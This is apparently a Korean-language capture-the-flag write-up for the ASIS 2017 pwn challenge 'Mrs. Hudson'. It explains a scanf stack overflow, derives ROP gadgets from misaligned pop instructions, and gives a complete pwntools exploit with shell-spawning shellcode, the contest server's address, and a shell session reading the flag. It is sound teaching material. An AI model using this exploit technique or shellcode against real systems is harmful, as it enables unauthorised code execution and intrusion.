# 2017 Asis - [PWN] Mrs. Hudson

## Key words

- 64bit ELF
- 64bit ROP Gadget

## Solution

문제는 다음과 같습니다.

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [sp+10h] [bp-70h]@1

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("Let's go back to 2000.");
  return __isoc99_scanf("%s", &v4);
}
```

NX가 꺼져 있기 때문에 쉘 코드를 만들고 그 쪽으로 뛰면 될 것 같습니다. 64비트 ELF는 ROP 체인 구성시 pop rdi, pop rdi 등의 가젯이 필요 합니다.

그런데 바이너리를 보면 이 가젯이 존재 하지 않는데 이는 약간의 트릭으로 찾을 수 있습니다.

```
.text:00000000004006F0                 pop     r14
.text:00000000004006F2                 pop     r15
.text:00000000004006F4                 retn
```

이런 가젯은 기본적으로 존재 하는데 이 가젯을 통해 pop rdi, ret; pop rsi, ret; 의 가젯을 구할 수 있습니다.

```
.text:00000000004006F3                 pop     rdi
.text:00000000004006F4                 retn

.text:00000000004006F1                 pop     rsi
.text:00000000004006F2                 pop     r15
.text:00000000004006F4                 retn
```

이를 이용하여 64bit ROP 체인을 구성할 수 있는데 마지막으로 scanf 쪽으로 뛰어 쉘 코드를 BSS 영역에 쓰고 이 쪽으로 점프 할수 있도록 페이로드를 구성합니다.

## Solution Code

```python
from pwn import *
import sys

p = None

if len(sys.argv) == 2:
    p = remote("178.62.249.106", 8642)
else:
    p = process("./mrs")

bss = 0x601100
pop_rdi_ret = 0x4006f3
pop_rsi_r15_ret = 0x4006f1
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
print p.recv()

payload = "A"*0x70 + p64(bss) + p64(pop_rsi_r15_ret) + p64(bss) + p64(0) + p64(0x400676) + p64(bss) + p64(bss)
p.sendline(payload)

p.sendline(p64(bss) + p64(bss+16) + shellcode)

p.interactive()
```

## Result

```
tbkim@ubuntu:~/ctfing/2017_asis/pwn$ python sol_mrs.py 1
[+] Opening connection to 178.62.249.106 on port 8642: Done
Let's go back to 2000.
[*] Switching to interactive mode

$ cd /home
$ ls
frontofficemanager
$ cd frontofficemanager
$ ls
flag
hudson_3ab429dd29d62964e5596e6afe0d17d9
$ cat flag
ASIS{W3_Do0o_N0o0t_Like_M4N4G3RS_OR_D0_w3?}
```